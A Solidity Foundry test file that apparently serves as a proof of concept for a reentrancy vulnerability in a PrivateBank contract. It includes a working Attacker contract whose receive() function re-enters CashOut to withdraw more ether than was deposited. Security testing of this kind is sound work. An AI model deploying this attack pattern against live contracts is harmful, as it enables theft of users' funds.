
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PrivateBank, Log} from "../src/PrivateBank.sol";

contract TestReentrancyPrivateBank is Test {
    PrivateBank public _contractUnderTest;
    Log public _log;

    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new PrivateBank(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints ---
        // Keep amounts within a reasonable, non-zero range
        vm.assume(attackVal >= 1 ether && attackVal <= type(uint128).max / 4);

        // --- 2. State Configuration (Pre-Condition) ---

        // --- 3. Funding ---
        // Victim needs funds to be drained
        vm.deal(address(_contractUnderTest), attackVal * 2);

        // Fund attacker and test contract
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(
            _attacker.exploitSucceeded(),
            "Reentrancy attack failed: exploitSucceeded flag was not set."
        );
    }

    receive() external payable {}
}

contract Attacker {
    PrivateBank public victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = PrivateBank(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;

        // Initial deposit into the victim so CashOut can be called
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        // Call vulnerable function; will trigger reentrancy in receive()
        victim.CashOut(val);

        // After attack, if we gained more than our initial balance, exploit succeeded
        if (address(this).balance > initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            // Re-enter before the state (balances) is updated in CashOut
            victim.CashOut(storedAttackVal);
        }
    }
}
